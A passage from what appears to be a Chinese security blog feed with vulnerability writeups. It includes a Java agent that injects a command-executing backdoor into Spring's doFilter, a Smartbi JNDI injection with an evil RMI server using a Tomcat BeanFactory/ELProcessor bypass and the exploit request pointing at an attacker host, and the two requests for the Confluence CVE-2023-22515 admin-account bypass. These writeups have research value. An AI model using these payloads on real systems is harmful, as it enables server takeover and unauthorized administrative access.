class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br> <br>            <span class="hljs-comment">//设置方法体</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd !=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br> <br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br> <br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Inject_Agent_Spring类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.java.inject;<br> <br><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br> <br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject_Agent_Spring</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;<br> <br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span>(vmd.displayName().equals(<span class="hljs-string">&quot;com.example.java_agent_springboot.JavaAgentSpringBootApplication&quot;</span>))&#123;<br> <br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br><span class="hljs-comment">//            System.out.println(vmd.displayName());</span><br> <br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动一个简单的Spring Boot项目</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-84.png" alt="img57"></p><p>运行<code>Inject_Agent_Spring</code>类，在doFilter方法中注入恶意代码，成功执行</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-85.png" alt="img58"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Smartbi_JNDI</title>
    <link href="/2023/11/28/Smartbi-JNDI/"/>
    <url>/2023/11/28/Smartbi-JNDI/</url>
    
    <content type="html"><![CDATA[<h1 id="Smartbi——高版本JNDI注入。"><a href="#Smartbi——高版本JNDI注入。" class="headerlink" title="Smartbi——高版本JNDI注入。"></a>Smartbi——高版本JNDI注入。</h1><h2 id="前情提要："><a href="#前情提要：" class="headerlink" title="前情提要："></a>前情提要：</h2><p>Smartbi存在未授权访问后台接口漏洞，结合 DB2 JDBC 利用方式，可导致 JNDI 注入漏洞。</p><h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>首先从参数接收点入手。在RMIServlet中<code>doGet</code>和<code>doPost</code>用于参数接收</p><p><code>doGet</code>：通过参数jsonCallback来接收<code>className</code></p><p><img src="https://i.miji.bid/2023/11/28/030d42f1843e49ad885c184da4af9c08.png" alt="image-20231128144801429"></p><p><code>doPost</code>通过解析RMI信息来获取className、methodName、params。这三个变量在之前的分析文章也经常出现。实际就是要执行的类名、方法名、加参数。</p><p><img src="https://i.miji.bid/2023/11/28/59b00e892f9859ac9f296c3d03079eec.png" alt="image-20231128151149611"></p><p><code>processExecute</code>方法的作用是解析<code>request</code>中的相关信息，并利用反射机制调用指定类的指定方法，并将<code>params</code>转化为对应类型的参数传入到该方法中去执行。最终，将方法执行的结果以字符串形式返回，并赋给<code>resultStr</code>变量。</p><p><img src="https://i.miji.bid/2023/11/28/e0fc0a5766420ecf36d00be4f7b8fc15.md.png" alt="image-20231128153234000"></p><p><code>testConnection</code>从数据库连接池中获取了一个数据库连接对象</p><p><img src="https://i.miji.bid/2023/11/28/b956c56783af239a6468fe7ce63f57df.png" alt="image-20231128154707425"></p><p><code>getConnection</code>中有很多连接方法。重点关注这个JNDI连接方式。首先从上面接收的<code>url</code>后截取JNDI后面的字符串进行<code>lookup</code>，其中<code>lookup</code>的参数可控，这也是本次漏洞的触发点。</p><p><img src="https://i.miji.bid/2023/11/28/798283be34f3fed7f525ccbf066e37f4.png" alt="image-20231128154917257"></p><h2 id="高版本JNDI介绍："><a href="#高版本JNDI介绍：" class="headerlink" title="高版本JNDI介绍："></a>高版本JNDI介绍：</h2><p>低版本的JNDI注入是可以加载远程恶意类的。但是在高版本官方对远程加载类进行了限制。目前高版本JDK的防护方式主要是针对加载远程的<code>ObjectFactory</code>的加载做限制，只有开启了某些属性后才会通过指定的远程地址获取<code>ObjectFactory</code>的Class并实例化，进而通过<code>ObjectFactory#getObjectInstance</code>来获取返回的真实对象。</p><p>但是在加载远程地址获取<code>ObjectFactory</code>前，首先在本地<code>ClassPath</code>下加载指定的<code>ObjectFactory</code>，本地加载<code>ObjectFactory</code>失败后才会加载远程地址的<code>ObjectFactory</code>，所以一个主要的绕过思路就是加载本地ClassPath下的<code>ObjectFactory</code>。</p><p>我们需要找到一个<code>javax.naming.spi.ObjectFactory</code>接口的实现类，在这个实现类的<code>getObjectInstance</code>可以实现一些恶意操作。但是在JDK提供的原生实现类里其实并没有操作空间。所以下面我们主要的思路就是在一些常用的框架或者组件中寻找可利用的ObjectFactory实现类。</p><p>而Smartbi自带的jdk版本是<code>8.0.202.3</code>，正是修复JNDI过后的高版本jdk。</p><p><img src="https://i.miji.bid/2023/11/28/fa9424a8d2cd310b285f901b2675b335.png" alt="image-20231128155329452"></p><h3 id="绕过思路："><a href="#绕过思路：" class="headerlink" title="绕过思路："></a>绕过思路：</h3><p>Tomcat下的绕过比较精彩的并不是EL表达式利用，而是通过<code>BeanFactory#getObjectInstance</code>将这个漏洞的利用面从仅仅只能从<code>ObjectFactory</code>实现类的<code>getObjectInstance</code>方法利用扩展为一次可以调用”任意”类的”任意”方法的机会，但是对调用的类和方法以及参数有些限制。</p><ul><li>该类必须包含public无参构造方法</li><li>调用的方法必须是public方法</li><li>调用的方法只有一个参数并且参数类型为String类型</li></ul><p>所以下面我们只要找到某个类的某个方法既满足了上面的条件又实现我们想要的功能。</p><ul><li><code>javax.el.ELProcessor#eval</code>执行命令，但是<code>ELProcessor</code>是在Tomcat8才引入的。</li><li><code>groovy.lang.GroovyShell#evaluate(java.lang.String)</code>通过Groovy执行命令。</li><li><code>com.thoughtworks.xstream.XStream().fromXML(String)</code>通过调用<code>XStream</code>转换XML时的反序列化漏洞导致的RCE，这里之所以选择<code>XStream</code>是因为Xstream的反序列化漏洞和影响版本比较多。JSON的转换的漏洞相对来说通用性不高。</li><li><code>org.yaml.snakeyaml.Yaml#load(java.lang.String)</code>加载Yaml时的反序列化漏洞，在SpringBoot中经常会使用<code>snakeyaml</code>来进行yml配置文件的解析。</li><li><code>org.mvel2.MVEL#eval(String)</code>执行命令，这里<code>浅蓝</code>师傅文章中提到的是<code>MVEL</code>类是private所以要找上层调用，我在<code>2.0.17</code>中测试<code>Mvel</code>是存在public无参构造方法的，高版本确实换成了private构造方法。所以只能找那里调用了<code>Mvel#eval</code>方法，而<code>org.mvel2.sh.ShellSession#exec</code>调用了<code>Mvel#eval</code>，因此可以通过<code>ShellSession#exec</code>来间接完成调用。</li><li><code>com.sun.glass.utils.NativeLibLoader#loadLibrary(String)</code>加载DLL，前提是我们已经将构造好的DLL上传至目标上，所以局限性比较大。</li></ul><h3 id="服务端代码："><a href="#服务端代码：" class="headerlink" title="服务端代码："></a>服务端代码：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIServerbypass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;<br>        System.out.println(<span class="hljs-string">&quot;Creating evil RMI registry on port 1097&quot;</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1097</span>);<br><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br><br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);<br>        registry.bind(<span class="hljs-string">&quot;Object&quot;</span>, referenceWrapper);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi//version/.stub?className=DataSourceService&amp;methodName=testConnection&amp;params=%5B%7B%22driverType%22%3A%22aaa%22%2C%22driver%22%3A%22com.ibm.db2.jcc.DB2Driver%22%2C%22maxConnection%22%3A1%2C%22transactionIsolation%22%3A1%2C%22validationQueryMethod%22%3A3%2C%22url%22%3A%22JNDI%3Armi%3A%2F%2F10.65.14.146%3A1097%2FObject%22%7D%5D</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.181.67:18080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4<br><br><span class="language-ebnf"><span class="hljs-attribute">Yuanyi</span></span><br></code></pre></td></tr></table></figure><p><img src="https://i.miji.bid/2023/11/28/ee4de4eff44e737801fd4f753e34f824.png" alt="image-20231128160927981"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Confluence 属性覆盖导致权限绕过漏洞 (CVE-2023-22515)</title>
    <link href="/2023/11/09/CVE-2023-22515/"/>
    <url>/2023/11/09/CVE-2023-22515/</url>
    
    <content type="html"><![CDATA[<h1 id="Confluence-属性覆盖CVE-2023-22515"><a href="#Confluence-属性覆盖CVE-2023-22515" class="headerlink" title="Confluence 属性覆盖CVE-2023-22515"></a>Confluence 属性覆盖CVE-2023-22515</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>Confluence 是一个非常大的 Java 应用程序，基于 Apache Struts 框架构建。作为其中的一部分，XWork2 使用了该框架。<strong>XWork 框架允许通过 HTTP 请求中提供的 HTTP 参数来设置 Java 对象的参数</strong></p><p>例如在程序中，调用了方法:<code>getFormData().setName(&quot;Charles&quot;)</code></p><p>通过XWork进行http发送，就是:<code>formData.name=Charles</code></p><p>如果<code>getFormData()</code> 返回 null，则使用默认构造器，再用<code>setFormDat(Object object)</code> 进行设置</p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>先从正常初始化创建<code>admin</code>权限用户入手，正常初始化<code>admin</code>权限的用户数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/setup/setupadministrator.action</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.146:8090<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>117<br><span class="hljs-attribute">X-Atlassian-Token</span><span class="hljs-punctuation">: </span>no-check<br><br><span class="language-dts"><span class="hljs-attr">username</span><span class="hljs-operator">=</span>nsfocus<span class="hljs-variable">&amp;</span>fullN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>nsfocus<span class="hljs-variable">&amp;email</span>=nsfocus%<span class="hljs-number">40</span>nsfocus.org<span class="hljs-variable">&amp;password</span>=nsfocus<span class="hljs-variable">&amp;confirm</span>=nsfocus<span class="hljs-variable">&amp;setup</span>-<span class="hljs-attr">next-button</span><span class="hljs-operator">=</span>Next</span><br></code></pre></td></tr></table></figure><p>当将此数据包发送给服务端后，首先会来到<code>SetupCheckInterceptor</code>拦截器，触发<code>intercept()</code>方法：</p><p><img src="https://i.mji.rip/2023/11/09/0d5596e56119a4f9a9fc84ae2f3565c7.png" alt="image-20231109142612802"></p><p>可以看到这里是做了判断。如果两条红色语句<code>与</code>的结果为True则返回<code>&quot;alreadysetup&quot;</code>否则调用<code>actionInvocation.invoke()</code>。</p><p>那我们先来将这段代码按颜色分为前后两部分解释一下每条语句的含义：</p><p>前半部分：</p><p><code>BootstrapUtils.getBootstrapManager().isSetupComplete()</code> 和<code>ContainerManager.isContainerSetup()</code> 用于检查 Confluence 是否进行设置；</p><p><code>BootstrapUtils.getBootstrapManager()</code>返回 <code>DefaultAtlassianBootstrapManager</code> 对象，再调用<code>isSetupComplete()</code> 方法</p><p><img src="https://i.mji.rip/2023/11/09/c9952de49b1d1fd76f1bd05399b59ee0.png" alt="image-20231109143509686"></p><p>这里会调用<code>applicationConfig.isSetupComplete()</code>而<code>isSetupComplete()</code>又会将全局变量<code>setupComplete</code>返回；我们看到在下面又有变量<code>setupComplete</code>的set方法。</p><p><img src="https://i.mji.rip/2023/11/09/4d5c5e72aebc420c37d94154445140ee.md.png" alt="image-20231109153435574"></p><p>也就是说只要我们让<code>SetupComplete</code>参数为False，那么整体的判断都会为false。（这个参数很重要后续会提到）</p><p>后半部分：</p><p>而<code>actionInvocation.invoke()</code>中的<code>actionInvocation</code>是<code>intercept()</code>传入的<code>DefaultActionInvocation</code>所以会调用它当中的invoke方法。而<code>DefaultActionInvocation.invoke()</code>是一个处理操作执行流程的控制器，它首先处理拦截器，再执行具体操作，最后执行预结果监听器和结果。这里将输入的内容交给<code>SafeParametersInterceptor</code>。</p><p><img src="https://i.mji.rip/2023/11/09/a6c66ddf0b40b4b58a4f9d4b067579ae.png" alt="image-20231109150849210"></p><p>正常流程<code>BootstrapUtils.getBootstrapManager().isSetupComplete()</code> 与<code>ContainerManager.isContainerSetup()</code>肯定为False。省略掉中间无用部分，最后来到验证用户（这里的验证逻辑是与现有用户进行匹配是否重名）验证成功后便可创建。</p><p><img src="https://i.mji.rip/2023/11/09/eede9e21c84b8832a6ad4889d9cbf748.png" alt="image-20231109144708304"></p><p>创建<code>admin</code>权限的用户：</p><p><img src="https://i.mji.rip/2023/11/09/e9c473131694a0f8e10115cd644c649b.md.png" alt="image-20231109151539524"></p><p>以上就是我们在初始化时创建用户的正常流程。那漏洞到底时如何产生的呢？还需要回归到我们的第一步。</p><p><img src="https://i.mji.rip/2023/11/09/0d5596e56119a4f9a9fc84ae2f3565c7.png" alt="image-20231109142612802"></p><p>在了解上面的正常流程后，我们可以这么简单认为。只要前半红色部分有一个为False，那么就会执行<code>actionInvocation.invoke()</code>也就是相当于创建用户。所以我们的主要思路还是放在如何让前半部分的两条语句任一变为False。</p><p>前置知识中提到了，XWorks 允许 以HTTP的形式调用对象的setter 方法。</p><p>所以我们此时需要寻找一个无需授权、Action对象还公开一个合适的get方法、该方法允许我们访问应用程序配置。</p><p>我们找到<code>ConfluenceActionSupport</code>类。在<code>ConfluenceActionSupport</code>中的<code>getBootstrapStatusProvider</code>中获取了<code>BootstrapStatusProviderImpl</code>的实例对象并返回。</p><p><img src="https://i.mji.rip/2023/11/09/14f099b658a9ecee162d085e47f3a012.md.png" alt="image-20231109162025299"></p><p>我们再跟到<code>BootstrapStatusProviderImpl</code>，发现该实例对象存在<code>getApplicationConfig</code>方法，而且有对应返回值。</p><p><img src="https://i.mji.rip/2023/11/09/cdb50b6bad2de13c4f65e2c070dccb07.png" alt="image-20231109162536006"></p><p>而在<code>ApplicationConfig</code>的实例对象中存在<code>setSetupComplete</code>，当中的参数<code>SetupComplete</code>就是我们在开始的时候分析的对初始判断起决定性作用的的参数。</p><p><img src="https://i.mji.rip/2023/11/09/7d76b0e89525c6ea033bf074df389c72.png" alt="image-20231109163116672"></p><p>详细的调用栈如下：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bootstrapStatusProvider</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">BootstrapStatusProviderImpl</span><br><span class="hljs-keyword"></span>ApplicationConfiguration<br>ApplicationConfig<br>setSetupComplete<br></code></pre></td></tr></table></figure><p>故转换成HTTP格式如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">bootstrapStatusProvider.applicationConfig.setupComplete=false<br></code></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li><p>先覆盖目标Confluence服务器中的<code>bootstrapStatusProvider.applicationConfig.setupComplete</code>属性：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.146:8090<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><br></code></pre></td></tr></table></figure><p><img src="https://i.mji.rip/2023/11/09/cf9d28314ca097c984a271fd5dec47ba.png" alt="image-20231109141047184"></p></li><li><p>然后新建管理员账户：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/setup/setupadministrator.action</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.146:8090<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>94<br><span class="hljs-attribute">X-Atlassian-Token</span><span class="hljs-punctuation">: </span>no-check<br><br><span class="language-dts"><span class="hljs-attr">username</span><span class="hljs-operator">=</span>nsfocus<span class="hljs-variable">&amp;</span>fullN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>nsfocus<span class="hljs-variable">&amp;email</span>=nsfocus%<span class="hljs-number">40</span>nsfocus.org<span class="hljs-variable">&amp;password</span>=nsfocus<span class="hljs-variable">&amp;confirm</span>=nsfocus<span class="hljs-variable">&amp;setup</span>-<span class="hljs-attr">next-button</span><span class="hljs-operator">=</span>Next</span><br></code></pre></td></tr></table></figure><p><img src="https://i.mji.rip/2023/11/09/f5c607d746a5d8c1bbb3cd9bee5e0a7e.png" alt="image-20231109141150966"></p></li><li><p>查看用户目录发现添加成功。</p><p><img src="https://i.mji.rip/2023/11/09/ddf718d90dd504710abcd6949ec74e9a.md.png" alt="image-20231109141252166"></p></li><li><p>登录直接为admin权限的用户：</p><p><img src="https://i.mji.rip/2023/11/09/a042312c54c2014224b934ae7a9be163.png" alt="image-20231109141527544"></p></li></ol><h3 id><a href="#" class="headerlink" title></a></h3><p>上传对比测试！！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>初识内存马</title>
    <link href="/2023/10/25/%E5%88%9D%E8%AF%86%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2023/10/25/%E5%88%9D%E8%AF%86%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="学习内存马之前你必须知道的知识"><a href="#学习内存马之前你必须知道的知识" class="headerlink" title="学习内存马之前你必须知道的知识"></a>学习内存马之前你必须知道的知识</h1><h2 id="JavaWeb三大件"><a href="#JavaWeb三大件" class="headerlink" title="JavaWeb三大件"></a>JavaWeb三大件</h2><p>当JavaWeb接收到请求时会依次经过 Listener  —&gt; Filter —&gt; Servlet</p><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</p><p>ServletContextListener：对Servlet上下文的创建和销毁进 行监听；ServletContextAttributeListener：监听 Servlet 上下文属性的添加、删除和替换；</p><p>HttpSessionListener：对 Session 的创建和销毁进行监听。Session 的销毁有两种情况，一个中 Session 超时，还有一种是通过调用 Session 对象的 invalidate() 方法使 session 失效。</p><p>HttpSessionAttributeListener：对 Session 对象中属性的添加、删除和替换进行监听；</p><p>ServletRequestListener：对请求对象的初始化和销毁进行监听；ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。</p><h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><p>可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。</p><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>filter 也称之为过滤器，是对 Servlet 技术的一个强补充，其主要功能是在 HttpServletRequest 到达 Servlet 之前，拦截客户的 HttpServletRequest ，根据需要检查 HttpServletRequest，也可以修改 HttpServletRequest 头和数据；在 HttpServletResponse 到达客户端之前，拦截 HttpServletResponse ，根据需要检查 HttpServletResponse，也可以修改 HttpServletResponse 头和数据。</p><h4 id="基本工作原理"><a href="#基本工作原理" class="headerlink" title="基本工作原理"></a>基本工作原理</h4><p>1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。</p><p>2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。</p><p>3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。</p><p>4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 